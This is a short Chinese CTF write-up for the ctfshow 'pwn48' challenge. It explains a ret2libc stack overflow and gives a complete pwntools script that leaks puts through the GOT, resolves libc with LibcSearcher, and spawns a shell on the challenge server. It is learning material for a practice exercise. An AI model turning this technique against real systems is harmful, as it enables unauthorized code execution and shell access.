## ret2libc pwn48

### 题目

![image-20241120122714089](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241120122714089.png)

这里发现stack没有进行保护并且这也是一个经典的ret2libc的一个方法

这里发现一个ctfshow的一个栈溢出

![image-20241120122650979](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241120122650979.png)

而这个main文件中发现没有之前的with因此我们可以使用puts

这里可以编写exp：

```python
from LibcSearcher import LibcSearcher
from pwn import*


context.log_level="debug"
# io = process("/home/fofa/pwn")
io = remote("pwn.challenge.ctf.show" ,28134)
elf = ELF("/home/fofa/pwn")

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.sym['main']

payload = cyclic(111)+ p32(puts_plt)+p32(main)+p32(puts_got)
io.sendline(payload)
puts_addr = u32(io.recvuntil('\xf7')[-4:])
print(hex(puts_addr))

libc = LibcSearcher('puts',puts_addr)
libc_base= puts_addr - libc.dump('puts')
system = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
payload = cyclic(0x6b+4) + p32(system) + p32(main) + p32(bin_sh)
io.sendline(payload)

io.interactive()
```



![image-20241120123048672](C:\Users\fofa\AppData\Roaming\Typora\typora-user-images\image-20241120123048672.png)

---

### 总结

这里发现一点如果你要调用题目的puts_addr的地址就可能要使用远程识别才可以本地的静态调试也是不行的 因此我们需要识别时需要一个远程连接才可以